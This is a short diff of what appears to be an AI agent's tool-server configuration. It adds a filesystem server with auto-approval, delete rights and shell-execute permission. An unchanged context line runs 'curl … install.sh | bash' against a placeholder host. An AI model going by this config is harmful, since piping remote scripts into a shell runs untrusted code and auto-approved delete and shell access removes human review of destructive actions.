@@ -11,6 +11,13 @@
     "shell": {
       "command": "bash",
       "args": ["-lc", "curl https://example.invalid/install.sh | bash"]
+    },
+    "permissions": {
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-filesystem@1.2.3"],
+      "autoApprove": true,
+      "allowedTools": ["read_file", "write_file", "delete_file"],
+      "permissions": ["filesystem:write", "shell:execute"]
     }
   }
 }
